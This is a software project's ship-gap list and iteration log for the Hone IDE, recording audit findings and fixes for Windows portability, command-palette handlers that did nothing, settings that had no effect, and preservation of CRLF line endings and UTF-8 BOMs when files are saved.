# Hone v1 — Ship Gap List

> Compiled 2026-05-12 from a parallel audit of editor/LSP, workbench/UX, git/terminal/debug/extensions, AI/themes, and iOS/sync against VS Code (with Cursor/Copilot parity as a stretch goal).
>
> Each entry maps 1:1 to a GitHub issue. Format: `[priority] short title — what's broken, where, what done looks like.`
>
> **Priorities**
> - **P0** — Ship blocker. Either fix or descope/rename before public release. Includes security, false-advertising risks, and signing.
> - **P1** — Major. Required for VS Code parity at v1. Without these the product reads as "demo".
> - **P2** — Important quality gaps. Targetable for v1 if scope allows; otherwise post-launch.
> - **P3** — Polish / post-v1.
>
> **Status legend** in evidence column: ✅ ⚠️ ❌ ❓

---

## Loop snapshot — 2026-05-13

> Cumulative state across the `/loop` iterations. Closed = code landed + tests green + typecheck clean (modulo pre-existing project-wide noise like `perry/i18n`).

**Tests baseline:** hone-core 1068/1068 · hone-relay 48/48 · hone-themes 1336/1336 · hone-editor 389/391 (2 pre-existing fails on the known-expected list: code-folding + perry/ui-in-bun import).

### 2026-05-14 / 2026-05-15 — Drift hunt + Windows hardening extension (iters 27–46)

This run extended the 2026-05-13 loop with 20 more iterations focused on (a) flushing config drift left behind by previous developers, (b) ship-blocker Windows bugs the original audit missed, (c) test/doc infrastructure that was added in the prior loop but never actually verified runnable on Windows. Highlights:

- **Config drift swept**: Info.plist `CFBundleVersion 1.0` → `0.1.0`; Android `versionName "1.0"` → `0.1.0`; package.json deps `file:../core` → `file:../hone-core`; perry.toml/config bundle IDs normalized to `com.hone.ide`; perry.config.ts perry-version pin `0.2.162` → `0.4.40`; previous-dev signing paths (`/Users/amlug/...`) → `.perry/` relative; perry.config.ts asset paths → `hone-icon.png`. **6 version sources** now verify clean via `scripts/verify-version.ts`.
- **Phantom-done audits**: `verify-version.ts`, `ci.yml`, `LICENSE` were all originally claimed Done but were actually missing — all genuinely added.
- **Windows ship-blockers**: (a) **Claude Code totally broken on Windows** — `unset CLAUDECODE; ... $(cat <file>)` is POSIX-only and cmd.exe rejects both; now branched to `set "CLAUDECODE=" && ... -p <inlined>` on Windows in both `claude-process.ts` and the render.ts relay path. (b) **Auto-update for ARM64 Windows broken** — `getPlatformKey` hardcoded `windows-x86_64`; now reads `PROCESSOR_ARCHITECTURE` env var. (c) **Auto-update binary-path probing** — `getBinaryPath` was hardcoded `C:\Program Files\Hone\hone-ide.exe`, missing `%LOCALAPPDATA%\Programs\Hone\` (the modern Squirrel/Velopack default). Now probes 5 candidate locations in priority order.
- **Shell-cmd quoting**: `lsp-bridge` POSIX fallback diagnostics + `debug-panel::buildRunCommand` (8 language branches) had unquoted `cd <ws>` and `<bin> <filePath>` calls. Workspaces with spaces in their path (very common on Windows with `C:\Users\<Name>\OneDrive\...`) would shell-break the Run-File and TS-fallback-diagnostics features. All interpolations now `"..."` quoted.
- **Path/env optimization**: `paths.ts::getHomeDir` now reads `process.env.HOME`/`USERPROFILE` directly instead of forking `/bin/echo $HOME` or `echo %USERPROFILE%` (avoids subprocess on every `getAppDataDir`/`getChatsDir` call); `getCwd` Windows fallback switched from `pwd` (POSIX-only) to `cd` (cmd.exe builtin).
- **Debug-marker paths cross-platform**: 12 `/tmp/hone-auto-*` literals in render.ts (used by automated test/pair markers) now use `getTempDir()` — debug-test hooks now actually fire on Windows builds.
- **Test scripts unrunnable**: `setup.ps1` / `teardown.ps1` had three bugs that would have killed the first agentic-test run on Windows — em-dashes in a UTF-8-without-BOM file (PS 5.1 reads as ANSI → parser error), `Add-Content` default UTF-16 LE encoding (corrupts seed files), locale-fragile `[double]::Parse` of unix timestamp (throws on de-DE/fr-FR). All fixed; both scripts now parse clean.
- **Doc accuracy**: `run-all.md`, `README.md`, `DEVELOPING.md`, `WINDOWS_PORT_NOTES.md` updated to reflect actual Windows toolchain state — added PS-equivalents for setup/teardown/troubleshooting, removed redundant `mv hone-ide hone-ide.exe` after perry's `--target windows` auto-extension, documented the `PERRY_RUNTIME_DIR` env-var path and the 0.4.40-vs-current-source disparity.

**Net at iter 46:** TS-layer Windows portability appears load-bearing-complete. The remaining open items are the §4a "big buckets" the followup explicitly flagged as not-loop-friendly (#10 model-backed inline completion, #21 minimap renderer, #25 editor splits, #56 hone-api runtime impl, iOS FFI items). One v1.1 follow-up filed: `release.yml::build-windows` only ships a single `Hone-*.exe` artifact even though perry.config.ts declares `['x86_64', 'aarch64']` arches — the iter-36/37 ARM64 fixes have no artifact to download until the release pipeline produces both. **Zero commits made across all 20 iters** per followup §7's "wait for explicit commit request" rule.

**Iter 47 — i18n source-of-truth completeness (2026-05-15):** wrote a throwaway scanner against `src/**/*.ts` to enumerate every `t('key')` call and diff against `locales/en.json`. Found **184 keys used in code but missing from en.json** — meaning the English default-locale file was incomplete; the runtime relied on `t()` falling back to the literal string, but translators had no source-of-truth enumeration of what existed. Examples: `Path copied`, `Find…`, `Find All References`, `Commit`, `Branches`, `Action requires command execution — v1.1.`, `Anonymous identifier sent with telemetry events`, etc. Added all 184 keys to `locales/en.json` with `key=value` (English self-translation) — file grew from 443 to **627 keys**. Comparable scan across all 13 locales confirms they're all still synchronized at exactly the new key set (none had partial divergence). Trade-off note: this **increased** perry's compile-time `Missing translation for key X in locale Y` warning count from ~unknown to ~2472 (184 new keys × 12 non-English locales + pre-existing gaps). That's intentional — the warnings now accurately enumerate the translator backlog, where previously they were silent on these keys because the keys weren't in the source-of-truth. The 13 non-English locale files stay untouched so that filling in real translations is the only way to clear the warnings (rather than letting English fall-through silently masquerade as translation). Verifier-clean (`perry compile --target windows` passes through the TS-codegen stage; only the pre-existing perry_runtime.lib link issue persists). Throwaway scanner scripts deleted from `.perry/` (gitignored anyway).

**Iter 48 — keybinding-path command palette no-op + dynamic-key gap (2026-05-15):** two findings on the heels of the iter-47 i18n work. (a) `t(next)` dynamic-key usage in `render.ts:480` (sidebar-location toast — `next` is either `'left'` or `'right'`) referenced keys that weren't in en.json. Added both. (b) **Real keyboard-shortcut bug**: `commands.ts:185` registers `workbench.action.showCommandPalette` with an **empty handler** (`() => {}`). The keybinding path `Cmd+Shift+P → view.commandPalette → executeCommand('workbench.action.showCommandPalette')` therefore silently did nothing. The native-menu path (`native-menu.ts:70`) called `showCommandPaletteAction()` directly and worked, but any user invocation via the registered keybinding or via a user-customized binding went through the broken command path. The palette UI itself shipped in the earlier loop (#15) so the UI exists, the handler just wasn't wired. Fixed by re-registering `workbench.action.showCommandPalette` in `render.ts` after `registerBuiltinCommands()` returns — same override pattern that's already used for `workbench.action.newEditor` (also in render.ts post-builtin-registration). The override points at `showCommandPaletteAction` (the actual sidebar-takeover opener). Added a comment explaining the why so future contributors don't undo it. Build verifier-clean. The fact that this bug shipped through both audit passes underscores that registered-but-empty handlers are silent failures — could justify adding a debug-mode assertion in `registerCommand` that warns when overwriting a no-op-only handler.

**Iter 49 — pattern-match on iter-48: 4 more empty-handler commands found (2026-05-15):** iter 48 was a single fix; auditing for the same bug pattern revealed **4 more workbench.action.* commands** silently no-op'd whenever invoked through the command palette (which dispatches via `executeCommand` at `command-palette.ts:164` — the very path users would expect to be canonical). `workbench.action.showOutline`, `workbench.action.showTimeline`, `workbench.action.showTasks`, `workbench.action.runBuildTask` all had `() => {}` stub handlers in `commands.ts` and were only "invokable" through the native menu's direct-dispatch path (`native-menu.ts` lines 79/82/85/88 call the actual functions). Net effect: picking "Show Outline" from the command palette did nothing; clicking "Show Outline" from the menu worked. Same for the other three. Verified by tracing all `executeCommand(...)` call sites in src/ — the command palette is the only general-purpose dispatcher today, and it goes straight through the registry. Fixed all 4 in `render.ts` post-`registerBuiltinCommands()` via the same override pattern, with a comment block documenting the bug class for future readers. Also caught (but deferred): `workbench.action.trustWorkspace` and `workbench.action.revokeWorkspaceTrust` have stub handlers and the actual `trustWorkspace`/`revokeWorkspaceTrust` functions exist in `workspace-trust.ts`, but they take a `folderPath` argument that the command-palette dispatch doesn't provide. Wiring them needs a wrapper that grabs the current workspace root — small but requires a decision on whether the command should target the active workspace implicitly or prompt the user; flagged as v1.1 follow-up. **Larger architectural observation**: `matchKeybinding` (`keybindings.ts:153`) is defined but never called anywhere in `src/` — the keybindings file is purely display-metadata. On macOS, `keyEquivalent` strings on the native menu items dispatch shortcuts through the macOS menu chain; on Windows/Linux, the native menu's keyboard handling is likely the same. So the bug class isn't "keybindings fire empty handlers" (they don't fire at all today) — it's specifically "command palette picks fire empty handlers." Until matchKeybinding gets wired, keyboard shortcuts only work via menu dispatch. Build verifier-clean.

**Iter 50 — 6 more palette-broken commands wired (2026-05-15):** continuing the pattern from iter 48/49. Audited every `() => {}` stub handler in `commands.ts` and cross-referenced against the action functions `native-menu.ts` imports from `render.ts` (which is the authoritative inventory of "real handlers exist for this command"). Six more palette-visible commands had stub handlers but had real action functions ready to wire: `file.save` → `saveFileAction`, `file.saveAs` → `saveFileAsAction`, `view.toggleSidebar` → `toggleSidebarAction`, `workbench.action.closeActiveEditor` → `closeEditorAction`, `edit.find` → `findAction`, `edit.replace` → `replaceAction`. All six wired in `render.ts` after `registerBuiltinCommands()` (which replaces the stub via `_commands.set(id, ...)` — Map semantics make this clean). Comment block in render.ts explicitly documents why edit.undo/redo/cut/copy/paste and view.zoomIn/Out/resetZoom are NOT wired here: those rely on the OS responder chain (focused-text-element dispatch), and invoking them from a command-palette picker without a focused element is undefined — needs a focused-element check before wiring, flagged as v1.1 follow-up. Other unrouted stubs (`view.toggleBottomPanel`, `view.toggleTerminal`, `workbench.action.closeAllEditors`, `workbench.action.selectTheme`, `file.saveAll`) don't have a corresponding action function in `native-menu.ts`'s import list — those need the actual implementation work, not just wiring. Build verifier-clean (TS codegen passes; only the pre-existing perry_runtime.lib link issue persists). **Tally of palette-dispatch fixes across iters 48–50: 11 commands now work from the command palette that previously silently no-op'd.**

**Iter 51 — 4 menu-only commands made palette-discoverable (2026-05-15):** the bug pattern from iters 48–50 was *registered but no-op handlers*; this iter found the dual: **4 commands registered in `menu.ts` but never in `commands.ts`**. They worked via the native menu (which has its own dispatcher in `native-menu.ts::dispatchCommand`) but were entirely invisible to the command palette — typing "Settings" or "Welcome" in the palette returned no match because the commands didn't exist in the registry. The corresponding action functions did exist in `render.ts`: `goToLineAction` (line 932), `openSettingsAction` (line 4779), `checkForUpdatesAction` (line 4840), `showWelcomeAction` (line 920). Added all four via `registerCommand` in `render.ts` post-`registerBuiltinCommands()`. Categorized: Go / Preferences / Help / Help. Each is now discoverable by typing its label into the palette. (`workbench.action.openDocs` and `workbench.action.showAbout` referenced in menu.ts but skipped here — no corresponding action function exists in render.ts yet; they'd be no-ops if added, which would re-introduce the bug iters 48–50 just fixed.) Build verifier-clean.

**Iter 52 — 5 more palette commands wired (2026-05-15):** continued audit found 5 more action functions in `render.ts` that were never registered as palette commands. (a) `toggleTerminalAction` (line 414) — `view.toggleTerminal` had a stub handler in commands.ts (caught by iter 50 but skipped because I missed that the action existed). Now wired. (b) `openFileAction` (line 2706) — `file.openFile` had a stub with a misleading comment `// Triggers native file picker` but no actual call. Wired. (c) `openFolderAction` (line 451) — `file.openFolder` wasn't in commands.ts at all (menu-only). Registered fresh. (d) `formatDocumentAction` (line 3220) — `edit.formatDocument` wasn't in commands.ts. Registered fresh under Edit category. (e) `goToDefinitionAction` (line 3747) — wired as `editor.action.revealDefinition` (the canonical VS Code ID for Go to Definition; matches LSP convention). All wired in the same render.ts override block now spanning ~17 commands total. Skipped (no action function found): `editor.action.goToSymbol`, `workbench.action.openDocs`, `workbench.action.showAbout`, `workbench.action.selectTheme`, `workbench.action.closeAllEditors`, `view.toggleBottomPanel`, `view.zoomIn/Out/resetZoom`, `file.saveAll`, `edit.undo/redo/cut/copy/paste/selectAll` — each needs the actual implementation, not just wiring. **Running tally across iters 48–52: 20 palette dispatch fixes** (16 wired no-op handlers + 4 newly-registered commands from iter 51).

**Iter 53 — 6 more palette commands wired: zoom + quickOpen + trust (2026-05-15):** following the iter-52 skipped-list note, found that several of the "no action function" entries actually DID have implementations I'd missed: (a) `view.zoomIn`/`view.zoomOut`/`view.resetZoom` all wired to existing `zoomInAction`/`zoomOutAction`/`zoomResetAction` (render.ts:904/909/916) — these adjust `editorFontSize` setting +1/-1/13. (b) `workbench.action.quickOpen` wired to `goToFileAction` (render.ts:994) — the sidebar-takeover quick-open implementation. Marked `showInPalette: false` since the user-facing `view.quickOpen` already routes through it (so the dispatch path goes view.quickOpen → executeCommand('workbench.action.quickOpen') → goToFileAction; both names now resolve correctly). (c) `workbench.action.trustWorkspace` and `workbench.action.revokeWorkspaceTrust` — previously deferred in iter 49 as needing a wrapper that grabs the current workspace. Implemented with closure: when the user picks Workspaces: Trust Current Folder from the palette, the handler reads the module-level `workspaceRoot` variable and calls `trustWorkspace(workspaceRoot)`. No-ops cleanly when no folder is open (length check). Added `revokeWorkspaceTrust` to the `workspace-trust` import statement. Comment block documents that these target the active workspace implicitly. **Running tally across iters 48–53: 26 palette dispatch fixes.** Remaining still-unimplemented commands: `selectTheme`, `closeAllEditors`, `file.saveAll`, `toggleBottomPanel`, `openDocs`, `showAbout`, `editor.action.goToSymbol`, `editor.action.gotoSymbol`, `edit.undo`/`redo`/`cut`/`copy`/`paste`/`selectAll` — these need actual implementation work, not wire-up. Build verifier-clean.

**Iter 54 — 4 more palette commands wired: closeAllEditors + Go to Symbol + toggleBottomPanel (2026-05-15):** found that 3 more entries on iter-53's "still unimplemented" list actually have plumbing I can wire today: (a) `workbench.action.closeAllEditors` → `closeAllOpenTabs()` (already exported from `views/tabs/tab-bar.ts`, used by the existing "Close All" tab-bar gesture). No dirty-tab prompt in v1; that's a polish step. (b) `editor.action.goToSymbol` and the alternate camelCase `workbench.action.gotoSymbol` → both wired to `goToFileAction` (the quick-open opener). Per #36's iter-25 work, quick-open already understands `@`-prefix for document symbols and `#`-prefix for workspace symbols — pre-filling the TextField with `@` needs a Perry TextField `setText` FFI (not yet exposed), so today the user types `@` themselves after Cmd+Shift+O lands them in quick-open. Functional; loses the "no-keystroke-from-target-state" property that VS Code has. Filed as v1.1 polish. (c) `view.toggleBottomPanel` → aliased to `toggleTerminalAction`. The "bottom panel" in v1 is the terminal pane only — there's no separate Problems/Output/Debug panes (LSP diagnostics live in popups, debug output is in the right pane). When v1.1 adds those, this alias will need to flip to a real multi-tab bottom-pane toggle. **Running tally across iters 48–54: 30 palette dispatch fixes.** Still-unimplemented (each needs new code, not wiring): `selectTheme` (needs picker UI), `file.saveAll` (needs per-tab buffer + dirty-aware save loop), `workbench.action.openDocs`/`showAbout` (no action functions exist), `edit.undo/redo/cut/copy/paste/selectAll` (responder-chain dispatch with focused-element check). Build verifier-clean.

**Iter 55 — 4 activity-panel switchers + saveAll arch note (2026-05-15):** keybindings.ts has `view.activity.files / search / git / chat` entries (Cmd+1..4 on iPad) that were never registered in commands.ts and therefore invisible to the command palette. The actual panel-switching function `switchSidebarPanel(idx)` exists module-internally in render.ts (line 4041) and dispatches by index: 0=Files, 1=Search, 2=Git, 3=Sync, 4=Chat-via-right-pane. Wired 4 palette commands: `view.activity.files` → "Show File Explorer", `view.activity.search` → "Show Search", `view.activity.git` → "Show Source Control" (matches VS Code's UI label), `view.activity.sync` → "Show Sync". Each uses inline closure: `() => { switchSidebarPanel(N); }`. Comment block notes that matchKeybinding still isn't wired so the keybindings.ts Cmd+1..4 entries don't fire today — palette is the working dispatch route. **Saving-all architecture finding (deferred)**: `file.saveAll` skipped after investigation. The IDE's tab model is "one editor instance, content swapped per tab from disk" — non-active tabs lose their content on switch (no per-tab content buffer). So `isTabDirty[i]` can only be `1` for the currently-active tab in practice; switching away from a dirty tab silently discards the changes. This is actually a separate architectural UX bug (no save-prompt on tab switch), but fixing it requires per-tab content buffers — substantial work, deferred. Until that lands, `saveAll` is semantically equivalent to `save active`, so wiring it would mislead users into thinking the command does more than it does. **Running tally across iters 48–55: 34 palette dispatch fixes.**

**Iter 56 — selectTheme + openDocs + showAbout: last of the easily-wireable commands (2026-05-15):** investigated `workbench.action.selectTheme` and discovered the theme-loader (`theme-loader.ts`) is Perry-stubbed to a *single* loaded theme: `loadTheme` always uses `DARK_DEFAULTS`, `setActiveTheme(name)` ignores the name and just re-notifies listeners, `getLoadedThemeNames()` returns ≤1 name. The actual runtime theme switching is the hardcoded `applyDarkColors()`/`applyLightColors()` palette pair in render.ts — the 15 VS Code themes from hone-themes are NOT loaded at runtime (this is the substance of #17/#18/#20, a big-bucket item). So a real 15-theme picker is impossible without the theme infrastructure actually working. Wired `selectTheme` as an *honest* dark/light toggle: reads `colorTheme` setting, flips Hone Dark ↔ Hone Light, routes through `updateSettings` so the existing settings-poll → `applyThemeChangeImpl` pipeline applies it (identical path to the Settings-panel cycle). Label explicitly says "Color Theme (toggle dark/light)" so users aren't misled into expecting a full picker. Also wired the two genuinely-dead menu items from iter-51's skip list: `workbench.action.openDocs` → `openExternalUrl('https://hone.codes/docs')` (reusing the iter-39 cross-platform URL opener), and `workbench.action.showAbout` → a notification showing `Hone IDE <HONE_VERSION>`. Both were referenced in menu.ts but had zero action function anywhere — they were dead menu items AND palette-invisible. Added imports for `openExternalUrl` (from markdown-render) and `HONE_VERSION` (from ./version) to render.ts. **Running tally across iters 48–56: 39 palette dispatch fixes.** The command-registry audit vein is now genuinely exhausted — every command in menu.ts/keybindings.ts/commands.ts either has a working handler or is one of: `file.saveAll` (needs per-tab buffer arch), `edit.undo/redo/cut/copy/paste/selectAll` (responder-chain, needs focused-element check). Both are documented architectural follow-ups, not wire-ups. Build verifier-clean.

**Iter 57 — two dead-UI no-op buttons fixed: New Folder + Extensions search (2026-05-15):** pivoted off the (exhausted) command-registry vein to a new audit: empty `() => {}` / `(t) => {}` callbacks on *widgets* (the iter-48 bug class, but for buttons/textfields instead of registerCommand). Grep across `src/workbench` surfaced 9 candidates; most were intentional (icon-only decoration buttons in breadcrumbs). Two were real ship bugs: (a) **Explorer "New Folder" button was a dead no-op** — `sidebar-render.ts:391` had `Button('', () => {})` while the "New File" button right beside it correctly called `newFileAction()`. Clicking New Folder in the file-explorer toolbar did nothing. Fixed by exporting `onNewFolder(parentDir)` from `context-menu.ts` (it was module-private; the context-menu right-click path used it but the toolbar button couldn't reach it) and wiring the button to `onNewFolder(sidebarWorkspaceRoot)`. (b) **Extensions panel search field did nothing** — `extensions-panel.ts:130` had `TextField(t('Search extensions'), (txt) => {})`. Typing in the search box had zero effect; all 11 built-ins always showed. Refactored to real live-filtering: extracted the list into a dedicated `_extListBox` sub-container (so re-filtering on each keystroke doesn't tear down the search field and drop keyboard focus), moved names/descs to module-level arrays, added module-level `onExtSearchInput`/`rebuildExtList` functions (Perry closure rule — the TextField callback must be a module-level fn reading module vars, not a capturing closure). Filter is case-insensitive substring on name OR description. `toggleBtns` kept as a fixed 11-slot array (null for filtered-out rows) so the `toggleExt`/`updateToggleLabel` index math stays correct; added a null guard to `updateToggleLabel`. Both fixes verifier-clean — notably the extensions refactor passed Perry's AOT verifier on the first build despite being a non-trivial closure restructure, validating the established module-level-fn pattern. The widget-callback audit found no other functional dead buttons (the rest are decoration).

**Iter 58 — editor font setting was entirely dead + macOS-only default (2026-05-15):** widget-callback audit wound down (remaining `() => {}` are decoration/status-labels; the explorer "..." overflow button needs a menu-popup FFI Perry doesn't expose — documented, not fixable TS-side). Pivoted to the "documented stub" grep and found a **bigger latent bug**: `Settings → Font Family` and `Font Size` are persisted to settings.ini, surfaced in the Settings UI (`settings-panel.ts:702`), included in the workspace-overridable whitelist (#42), and **never applied to the editor**. The editor is created with `new Editor(800, 600)` (render.ts:4356) and `setFont()` is never called — so the editor used its internal default and changing either setting did absolutely nothing (no restart would help either; the wiring simply didn't exist). Compounding it: the settings default `editorFontFamily = 'Menlo'` is macOS-only, so even if it *had* been applied, a fresh Windows install would request a font that doesn't exist and fall back to a proportional/serif system face — terrible for a code editor. The `@honeide/editor` component does expose `setFont(family, size)` (editor-component.ts:403). Fixed in two places: (a) at editor creation, read settings, substitute `monoFont()` (Consolas on Win / DejaVu Sans Mono on Linux / Menlo on Mac) when the family is empty OR is the unconfigured `'Menlo'` default on a non-macOS platform, clamp size to [6,96], call `ed.setFont(...)`. (b) in `onSettingsChanged` (the 500ms settings-version poll), live-re-apply font changes — placed *before* the theme early-return so a font-only change still takes effect, guarded by `_lastEditorFontFamily`/`_lastEditorFontSize` module vars so it only calls `setFont`+`render` when the value actually changed (no churn on every poll tick). Net: Font Family / Font Size settings now work for the first time, both at startup and live, and Windows/Linux get a real monospace editor face by default. Build verifier-clean.

**Iter 59 — dead-setting audit + honest framing for 6 inert settings (2026-05-15):** systematically cross-referenced every `editor*`/`terminal*` setting key against its consumption in render.ts/terminal-panel.ts. Found **6 settings that are persisted + shown in the Settings UI as interactive cycle/toggle/stepper rows but have ZERO runtime effect**: `editorWordWrap`, `editorLineNumbers`, `editorCursorStyle`, `editorMinimapEnabled`, `terminalFontSize`, `terminalCursorStyle`. Unlike iter-58's editorFontFamily/Size (which had a `setFont` FFI available so I could wire it), these have **no native FFI to apply them** — the `@honeide/editor` component exposes no `setCursorStyle`/`setLineNumbers`/`setWordWrap`, and the terminal FFI (`hone_terminal_open/poll/write/resize/close/live_set_theme/set_bg_fg`) has no font-size or cursor-style entry point. Wiring them requires editor-package / Perry-native work which is out of /loop scope (followup §8). They overlap known big-bucket items (#21 minimap, #74 word-wrap). Rather than leave 6 settings that look fully functional but silently do nothing — the same "false advertising" UX problem the #10/#11/#12 honest-framing fixes addressed — appended "Setting is saved but not yet active (v1.1)." to each of their Settings-UI descriptions. The settings still persist (so when the FFI lands the saved values apply immediately) but the user is no longer misled. Added the 6 new description strings to `locales/en.json` per the iter-47 source-of-truth principle (629→635 keys). Documents the FFI-gap finding so future audits don't re-investigate these as "missing wiring" — they're correctly identified as native-blocked. Build verifier-clean.

**Iter 60 — format-on-save corrupted/no-op'd CRLF files (Windows-relevant) (2026-05-15):** moved from "is the setting wired" to "does the wired path handle Windows data correctly". Audited `applyBuiltinFormatToString` (render.ts:3264, the built-in formatter that runs on every save when `editorFormatOnSave` or `filesTrimTrailingWhitespace` is set, and is also the workspace-overridable format path). **Bug**: it split content only on `\n` (charCodeAt === 10), so on a CRLF file every split line retained a trailing `\r` (charCode 13). Consequences: (a) the trailing-whitespace-trim loop only strips space(32)/tab(9) and stops at the first non-ws char — the `\r` sits at end-of-line and **blocks the scan entirely**, so trailing whitespace before the `\r` (`"code   \r\n"`) is never trimmed; trailing-whitespace-on-save silently does nothing for Windows-default CRLF files. (b) indentation normalization operated on lines still carrying `\r`, risking subtle mangling. CRLF is the default line ending on Windows, so this hit the exact platform the loop is meant to harden. Fixed using the existing `detectEolStyle(content)` helper (render.ts:2737): detect CRLF once up front, strip a trailing `\r` from each line during the split so all processing runs on clean content, then rejoin with the original EOL (`\r\n` if the file was CRLF, else `\n`) and emit the inserted final newline in that same EOL style. LF files are byte-identical to before (the `\r`-strip is a no-op on them). Net: trailing-whitespace trim, indent-normalize, and final-newline insertion now all work correctly on Windows-authored files, and a CRLF file stays CRLF after format-on-save instead of being silently left half-processed. Build verifier-clean.

**Iter 61 — same CRLF bug in the second trim path (2026-05-15):** pattern-matched iter 60's fix across every content-rewrite function. `inlineTrimTrailingWhitespace` (render.ts:3359) — the *separate* trim path invoked at render.ts:628 when `filesTrimTrailingWhitespace` is set but `editorFormatOnSave` is NOT (the two are independent settings, distinct code paths) — had the **identical** split-on-`\n`-only bug: CRLF lines kept a trailing `\r` that blocked the space/tab trim scan, so trailing-whitespace-on-save silently did nothing for Windows-default files even when the user explicitly enabled only that setting. Applied the identical iter-60 fix: `detectEolStyle` up front, strip `\r` on split, rejoin with original EOL. Also swept the other 15 `charCodeAt(i) === 10` line-scan loops in render.ts to classify rewrite-vs-readonly: `applyDetectedIndentation` (first-char scan, \r-immune), git-blame porcelain parse (parses git's own \n output), bracket-match offset→line/col (display-only, \r would offset a highlight by 1 col — cosmetic micro-issue, not data corruption) — none rewrite-and-persist, so no further CRLF data bugs. The two functions that actually write transformed content back to disk (iter-60 `applyBuiltinFormatToString`, iter-61 `inlineTrimTrailingWhitespace`) are now both CRLF-safe; that closes the format-on-save CRLF-corruption class for Windows. Build verifier-clean.

**Iter 62 — THE big one: every save silently converted CRLF→LF on Windows (2026-05-15):** iters 60–61 fixed the *format* paths; this iter checked the *plain* save path and found the root-cause data-corruption bug. Traced `editorInstance.getContent()` through `@honeide/editor`: `core/buffer/text-buffer.ts:45-58` **normalizes all CR/CRLF to `\n` on load** (constructor loop emits `\n` for code 13, skips a following 10). The editor's own CLAUDE.md confirms: "Line endings: Always normalized to `\n` internally; original line ending style preserved in EditorDocument for saving." But **hone-ide's save path never used that preserved style** — `saveFileAction` did `writeFileSync(path, editorInstance.getContent())` with the `\n`-normalized content. Net effect: **every save of a CRLF file (the Windows default line ending) silently rewrote the entire file as LF.** Consequences for a Windows user: open any repo file, make a one-line edit, save → `git diff` shows the *entire file* changed (every line's `\r\n`→`\n`); every commit carries massive line-ending churn; code review unusable; `git blame` destroyed. This is arguably the single worst Windows-portability bug in the codebase and it shipped silently because the macOS/Linux dev path uses LF where the no-op conversion is invisible. hone-ide *already* detects and tracks the file's EOL (`_currentEol = detectEolStyle(content)` at `displayFileContent`, render.ts:2970) — it just never applied it on write. Fix: added module-level `restoreEolForSave(content)` (extracted from the LF→CRLF logic already present in `cycleEolAction`) — when `_currentEol === 'CRLF'`, converts the buffer's `\n` back to `\r\n` (with a `\r\r\n` guard). Applied in `saveFileAction` (which also covers auto-save — it calls saveFileAction) and `onSaveAsCb` (Save As on a CRLF source preserves CRLF). Critical correctness detail handled: `markTabSaved(content.length)` must keep the **`\n`** length (the dirty-poll compares against the editor's normalized `\n` content, so a CRLF length would make every saved file show permanently dirty), while `writeFileSync` AND `_externalFileHash = djb2Hash(...)` must use the **EOL-restored disk bytes** (the 2s disk-watcher reads raw file content and hashes it — hashing `\n` while disk has `\r\n` would fire a false "changed on disk" warning every 2 seconds). Both now use the correct variant: `content` (\n) for tab-dirty state, `diskContent` (\r\n) for the write + disk-hash. The relay host-side write path (render.ts:7030) intentionally NOT touched — the host's `_currentEol` reflects the host's open file, not the arbitrary file a remote guest is saving, and cross-device EOL is a separate concern (guest/host may be different OSes). LF files are completely unaffected (`restoreEolForSave` early-returns when `_currentEol` isn't CRLF). Build verifier-clean. **This is the highest-impact Windows fix of the entire iter 27–62 run.**

**Iter 63 — disk-reload path: false-dirty CRLF + stale EOL (2026-05-15):** followed the iter-62 thread into the *other* place that calls `editorInstance.setContent(rawDiskContent)`: the silent disk-watcher reload (`pollExternalFileChange`, render.ts:1649). Two bugs, same root cause as iter-62's correctness detail. (a) **False-dirty on reload**: after a clean tab is silently reloaded from disk, it called `markTabSaved(fresh.length)` where `fresh` is the raw disk bytes. For a CRLF file `fresh.length` > `editorInstance.getContent().length` (the buffer normalizes `\r\n`→`\n` on setContent), so the dirty-poll — which compares the editor's normalized `\n` length against the stored saved-length — would **instantly flag the just-reloaded, untouched tab as dirty**, showing a spurious modified-dot and (with auto-save on) triggering a pointless save. Fixed to `markTabSaved(editorInstance.getContent().length)`, matching the already-correct pattern in `displayFileContent` (render.ts:3005). (b) **Stale EOL after external conversion**: the reload didn't re-run `detectEolStyle(fresh)`, so if an external tool converted the file's line endings (e.g. `dos2unix`, a formatter, a git checkout with different `core.autocrlf`), `_currentEol` kept the pre-change value and the *next* save via the iter-62 `restoreEolForSave` would rewrite the file with the **wrong** EOL — re-corrupting a file the user never edited. Added `_currentEol = detectEolStyle(fresh)` + `updateStatusBarEolImpl` to the reload branch so EOL tracking stays truthful across external changes. Audited all 5 `markTabSaved(...)` call sites: the other 4 (manual save, Save As, displayFileContent open, relay guest-confirm) already use editor-normalized `getContent().length` — only the reload path was wrong. Build verifier-clean. Closes the CRLF/EOL-correctness class across **all** content↔disk boundaries: open (iter 62 detect), format-save (60/61), plain+Save-As save (62), and external reload (63).

**Iter 64 — UTF-8 BOM: phantom leading char + silent strip on save (2026-05-15):** the EOL-correctness thread's sibling. Windows tools write UTF-8 *with* a BOM by default — Notepad, older Visual Studio, PowerShell `Out-File` and `>` redirection. `safeReadFile` returned content with the leading U+FEFF intact and `displayFileContent` passed it straight to `editorInstance.setContent()`. The `@honeide/editor` TextBuffer's normalize loop (text-buffer.ts:45-58) only collapses CR/CRLF, **not** the BOM — so U+FEFF became a phantom zero-width leading character in the buffer. Symptoms: (a) line-1 column numbers shifted by one (cursor "column 1" was really after the BOM); (b) the `charCodeAt(0)===118` git-LFS-pointer heuristic in displayFileContent broke for any BOM'd file (sees 65279, not 'v'); (c) the first syntax token on line 1 absorbed U+FEFF, mis-highlighting it; (d) most damaging — `getContent()` returned the U+FEFF, and on the pre-iter-62 path it was written back, but post-iter-62 the editor buffer's normalize could drop it, so saving a BOM file would **silently strip the BOM** → whole-file git churn again + breakage for toolchains that *require* the BOM (some Windows compilers, CSV importers, etc.). Fixed VS-Code-style: detect+strip the leading U+FEFF before `setContent` in BOTH the open path (displayFileContent) and the external-reload path (pollExternalFileChange), track presence in a new `_currentHadBOM` module flag, and fold BOM re-prepend into the existing `restoreEolForSave` chokepoint (renamed conceptually to "prepare content for disk" — it now does EOL-restore + BOM-restore in one place, automatically covering both save sites + auto-save). Correctness details preserved: LFS heuristic + EOL detection now run on the BOM-stripped `body` (so a BOM no longer skews them); `_externalFileHash` still hashes the **raw** content (BOM included) at open/reload and the **disk bytes** (BOM re-added by restoreEolForSave) at save, so the disk-watcher's raw-file-read hash always matches and never fires a phantom "changed on disk". Used `String.fromCharCode(0xFEFF)` rather than a literal BOM char to avoid embedding an invisible character in the source. Net: UTF-8-BOM files (the Windows-default UTF-8 flavor) now edit cleanly and round-trip byte-identical. Build verifier-clean.

